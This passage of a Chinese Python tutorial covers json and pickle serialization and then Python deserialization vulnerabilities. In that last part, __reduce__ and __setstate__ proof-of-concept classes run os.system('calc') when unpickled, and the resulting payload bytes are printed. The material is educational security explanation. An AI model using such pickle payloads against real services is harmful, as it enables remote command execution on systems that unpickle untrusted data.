class="hljs-built_in">type</span>(data4))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.json&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># indent 格式化保存字典，默认为None，小于0为零个空格。indent=4缩进4个空格</span><br>    f.write(json.dumps(<span class="hljs-built_in">dict</span>, indent=<span class="hljs-number">4</span>))<br>    json.dump(<span class="hljs-built_in">dict</span>, f, indent=<span class="hljs-number">4</span>)  <span class="hljs-comment"># 传入文件描述符，和dumps一样的结果</span><br></code></pre></td></tr></table></figure><p>得到的输出结果如下（格式化所有的数据类型为str类型）：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">[] &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-number">2</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br><span class="hljs-string">&quot;3&quot;</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br>&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">18</span>&#125; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>test.json中的内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Tom&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;age&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">18</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><hr><h3 id="load和loads函数"><a href="#load和loads函数" class="headerlink" title="load和loads函数"></a>load和loads函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br><span class="hljs-built_in">dict</span> = <span class="hljs-string">&#x27;&#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125;&#x27;</span>   <span class="hljs-comment"># 将字符串还原为dict</span><br>data1 = json.loads(<span class="hljs-built_in">dict</span>)<br><span class="hljs-built_in">print</span>(data1, <span class="hljs-built_in">type</span>(data1))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data2 = json.loads(f.read())    <span class="hljs-comment"># load的传入参数为字符串类型</span><br>    <span class="hljs-built_in">print</span>(data2, <span class="hljs-built_in">type</span>(data2))<br>    f.seek(<span class="hljs-number">0</span>)                       <span class="hljs-comment"># 将文件游标移动到文件开头位置</span><br>    data3 = json.load(f)<br>    <span class="hljs-built_in">print</span>(data3, <span class="hljs-built_in">type</span>(data3))<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">18</span>&#125; &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">dict</span>&#x27;&gt;</span><br><span class="hljs-class"></span>&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">18</span>&#125; &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">dict</span>&#x27;&gt;</span><br><span class="hljs-class"></span>&#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">18</span>&#125; &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">dict</span>&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h3 id="读取多行的JSON文件"><a href="#读取多行的JSON文件" class="headerlink" title="读取多行的JSON文件"></a>读取多行的JSON文件</h3><p>假如要读取一个多行的JSON文件：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;坂&quot;</span>: [<span class="hljs-string">&quot;坂5742&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;构&quot;</span>: [<span class="hljs-string">&quot;构6784&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;共&quot;</span>: [<span class="hljs-string">&quot;共5171&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;钩&quot;</span>: [<span class="hljs-string">&quot;钩94a9&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;肮&quot;</span>: [<span class="hljs-string">&quot;肮80ae&quot;</span>]&#125;<br>&#123;<span class="hljs-string">&quot;孤&quot;</span>: [<span class="hljs-string">&quot;孤5b64&quot;</span>]&#125;<br></code></pre></td></tr></table></figure><p>如果直接使用：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json_data = json.<span class="hljs-built_in">load</span>(f)<br></code></pre></td></tr></table></figure><p>就会报错：抛出异常<strong>JSONDecodeError</strong>。<br> 表示数据错误，数据太多。</p><p><strong>因为json只能读取一个文档对象</strong>，有两个解决办法：<br> 1、单行读取文件,一次读取一行文件。<br> 2、保存数据源的时候，格式写为一个对象。</p><p>1、<strong>单行读取文件</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br> <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        line = line.strip()   <span class="hljs-comment"># 使用strip函数去除空行</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">0</span>:<br>            json_data = json.loads(line)<br></code></pre></td></tr></table></figure><p>2、<strong>合并为一个对象</strong></p><p>将json文件处理成一个对象文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<span class="hljs-string">&quot;dict&quot;</span>: [<br>&#123;<span class="hljs-string">&quot;坂&quot;</span>: [<span class="hljs-string">&quot;坂5742&quot;</span>]&#125;,<br>&#123;<span class="hljs-string">&quot;构&quot;</span>: [<span class="hljs-string">&quot;构6784&quot;</span>]&#125;,<br>&#123;<span class="hljs-string">&quot;共&quot;</span>: [<span class="hljs-string">&quot;共5171&quot;</span>]&#125;,<br>&#123;<span class="hljs-string">&quot;钩&quot;</span>: [<span class="hljs-string">&quot;钩94a9&quot;</span>]&#125;,<br>&#123;<span class="hljs-string">&quot;肮&quot;</span>: [<span class="hljs-string">&quot;肮80ae&quot;</span>]&#125;,<br>&#123;<span class="hljs-string">&quot;孤&quot;</span>: [<span class="hljs-string">&quot;孤5b64&quot;</span>]&#125;<br>]&#125;<br></code></pre></td></tr></table></figure><p>然后再用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json_data = json.loads(f.read())<br></code></pre></td></tr></table></figure><hr><h1 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h1><p>pickle模块实现了用于对Python对象结构进行 序列化 和 反序列化 的<strong>二进制协议</strong>，与json模块不同的是pickle模块序列化和反序列化的过程分别叫做 pickling 和 unpickling：</p><ul><li>*<strong>pickling：*</strong> 是将Python对象转换为字节流的过程；</li><li>*<strong>unpickling：*</strong> 是将字节流二进制文件或字节对象转换回Python对象的过程；</li></ul><h2 id="pickle模块与json模块对比"><a href="#pickle模块与json模块对比" class="headerlink" title="pickle模块与json模块对比"></a>pickle模块与json模块对比</h2><ul><li>JSON是一种文本序列化格式（它输出的是unicode文件，大多数时候会被编码为utf-8），而pickle是一个二进制序列化格式;</li><li>JOSN是我们可以读懂的数据格式，而pickle是二进制格式，我们无法读懂；</li><li>JSON是与特定的编程语言或系统无关的，且它在Python生态系统之外被广泛使用，而pickle使用的数据格式是特定于Python的；</li><li>默认情况下，JSON只能表示Python内建数据类型，对于自定义数据类型需要一些额外的工作来完成；pickle可以直接表示大量的Python数据类型，包括自定数据类型（其中，许多是通过巧妙地使用Python内省功能自动实现的；复杂的情况可以通过实现specific object API来解决）</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 将指定的Python对象通过pickle序列化作为bytes对象返回，而不是将其写入文件</span><br>dumps(obj, <span class="hljs-attribute">protocol</span>=None, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>)<br> <br><span class="hljs-comment"># 将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回</span><br>loads(bytes_object, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)<br> <br><span class="hljs-comment"># 将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于`Pickler(file, protocol).dump(obj)`</span><br>dump(obj, file, <span class="hljs-attribute">protocol</span>=None, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>)<br> <br><span class="hljs-comment"># 从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象</span><br>load(file, *, <span class="hljs-attribute">fix_imports</span>=<span class="hljs-literal">True</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;ASCII&quot;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&quot;strict&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="pickle模块实例"><a href="#pickle模块实例" class="headerlink" title="pickle模块实例"></a>pickle模块实例</h2><h3 id="python-2-X"><a href="#python-2-X" class="headerlink" title="python 2.X"></a>python 2.X</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>var_a = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>:(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)&#125;<br> <br><span class="hljs-comment"># 序列化</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>var_b = pickle.dumps(var_a)<br><span class="hljs-meta">&gt;&gt;&gt; </span>var_b<br><span class="hljs-string">&quot;(dp0\nS&#x27;a&#x27;\np1\nS&#x27;str&#x27;\np2\nsS&#x27;c&#x27;\np3\nI01\nsS&#x27;b&#x27;\np4\nF11.1\nsS&#x27;e&#x27;\np5\nI10\nsS&#x27;d&#x27;\np6\nNsS&#x27;g&#x27;\np7\n(I4\nI5\nI6\ntp8\nsS&#x27;f&#x27;\np9\n(lp10\nI1\naI2\naI3\nas.&quot;</span><br> <br><span class="hljs-comment"># 反序列化</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>var_c = pickle.loads(var_b)<br><span class="hljs-meta">&gt;&gt;&gt; </span>var_c<br>&#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;g&#x27;</span>: (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>), <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]&#125;<br></code></pre></td></tr></table></figure><h3 id="python-3-X"><a href="#python-3-X" class="headerlink" title="python 3.X"></a>python 3.X</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> pickle<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>var_a = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>:(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)&#125;<br> <br><span class="hljs-comment"># 序列化</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>var_b = pickle.dumps(var_a)<br><span class="hljs-meta">&gt;&gt;&gt; </span>var_b<br><span class="hljs-string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x00eq\x01K\nX\x01\x00\x00\x00aq\x02X\x03\x00\x00\x00strq\x03X\x01\x00\x00\x00fq\x04]q\x05(K\x01K\x02K\x03eX\x01\x00\x00\x00gq\x06K\x04K\x05K\x06\x87q\x07X\x01\x00\x00\x00bq\x08G@&amp;333333X\x01\x00\x00\x00cq\t\x88X\x01\x00\x00\x00dq\nNu.&#x27;</span><br> <br><span class="hljs-comment"># 反序列化</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>var_c = pickle.loads(var_b)<br><span class="hljs-meta">&gt;&gt;&gt; </span>var_c<br>&#123;<span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>: (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>), <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="dump-与load"><a href="#dump-与load" class="headerlink" title="dump()与load()"></a>dump()与load()</h3><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> pickle</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">var_a = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;str&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;b&#x27;</span>: <span class="hljs-number">11.1</span>, <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;f&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], <span class="hljs-string">&#x27;g&#x27;</span>:(<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)&#125;</span><br> <br># 持久化到文件<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pickle.txt&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    pickle.dump(var_a, f)</span><br><span class="hljs-meta prompt_">...</span><br> <br># 从文件中读取数据<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pickle.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="hljs-meta prompt_">...</span> <span class="language-python">    var_b = pickle.load(f)</span><br><span class="hljs-meta prompt_">...</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">var_b</span><br>&#123;&#x27;e&#x27;: 10, &#x27;a&#x27;: &#x27;str&#x27;, &#x27;f&#x27;: [1, 2, 3], &#x27;g&#x27;: (4, 5, 6), &#x27;b&#x27;: 11.1, &#x27;c&#x27;: True, &#x27;d&#x27;: None&#125;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p><em>说明：</em></p><p>默认情况下Python 2.x中pickled后的数据是字符串形式，需要将它转换为字节对象才能被Python 3.x中的pickle.loads()反序列化；Python 3.x中pickling所使用的协议是v3，因此需要在调用pickle.dumps()时指定可选参数protocol为Python 2.x所支持的协议版本（0,1,2），否则pickled后的数据不能被被Python 2.x中的pickle.loads()反序列化；</p><p>Python 3.x中pickle.dump()和pickle.load()方法中指定的文件对象，必须以二进制模式打开，而Python 2.x中可以以二进制模式打开，也可以以文本模式打开。</p><hr><h1 id="python反序列化漏洞"><a href="#python反序列化漏洞" class="headerlink" title="python反序列化漏洞"></a>python反序列化漏洞</h1><h2 id="python序列化反序列化相关函数"><a href="#python序列化反序列化相关函数" class="headerlink" title="python序列化反序列化相关函数"></a>python序列化反序列化相关函数</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pickle.dump<span class="hljs-comment">(obj, file)</span> ：将对象序列化后保存到文件。<br>pickle.load<span class="hljs-comment">(file)</span> ：读取文件， 将文件中的序列化内容反序列化为对象。<br>pickle.dumps<span class="hljs-comment">(obj)</span> ：将对象序列化成字符串格式的字节流。<br>pickle.loads<span class="hljs-comment">(bytes_obj)</span> ：将字符串格式的字节流反序列化为对象。<br></code></pre></td></tr></table></figure><hr><h2 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h2><ul><li><strong>reduce</strong>() ：反序列化时调用。</li><li><strong>reduce_ex</strong>() ：反序列化时调用。</li><li><strong>setstate</strong>() ：反序列化时调用。</li><li><strong>getstate</strong>() ：序列化时调用。</li></ul><hr><h2 id="python魔术方法实例详解"><a href="#python魔术方法实例详解" class="headerlink" title="python魔术方法实例详解"></a>python魔术方法实例详解</h2><h3 id><a href="#" class="headerlink" title="&lt;__reduce__&gt;"></a>&lt;__reduce__&gt;</h3><p>代码实例</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">A</span>(<span class="hljs-title">object</span>):</span><br><span class="hljs-class">def __reduce__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">print(&#x27;反序列化调用&#x27;)</span><br><span class="hljs-class">return (<span class="hljs-title">os</span>.<span class="hljs-title">system</span>,(&#x27;<span class="hljs-title">calc&#x27;</span>,))</span><br><span class="hljs-class"></span><br><span class="hljs-class">a = <span class="hljs-type">A</span>()</span><br><span class="hljs-class">p_a = pickle.dumps(<span class="hljs-title">a</span>)</span><br><span class="hljs-class">pickle.loads(<span class="hljs-title">p_a</span>)</span><br><span class="hljs-class">print(&#x27;==========&#x27;)</span><br><span class="hljs-class">print(<span class="hljs-title">p_a</span>)</span><br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//弹计算机<br>反序列化调用<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>nt\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>system\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">93</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>calc\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">85</span>\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>R\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>.&#x27;<br></code></pre></td></tr></table></figure><hr><h3 id="-1"><a href="#-1" class="headerlink" title="&lt;__setstate__&gt;"></a>&lt;__setstate__&gt;</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">import pickle<br>import os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br><br>    <span class="hljs-comment"># 构造 __setstate__ 方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setstate__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name</span>):<br>        os.system(<span class="hljs-string">&#x27;calc&#x27;</span>)  <span class="hljs-comment"># 恶意代码</span><br><br>tmp = pickle.dumps(<span class="hljs-title class_">SerializePerson</span>(<span class="hljs-string">&#x27;tom&#x27;</span>))  <span class="hljs-comment"># 序列化</span><br>pickle.loads(tmp)  <span class="hljs-comment"># 反序列化 此时会弹出计算器</span><br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//弹计算机<br>反序列化调用<br><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>b&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">80</span>\<span class="hljs-keyword">x</span><span class="hljs-number">04</span>\<span class="hljs-keyword">x</span><span class="hljs-number">95</span>\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>nt\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span class="hljs-keyword">x</span><span class="hljs-number">8</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">06</span>system\<span class="hljs-keyword">x</span><span class="hljs-number">94</span>\<span 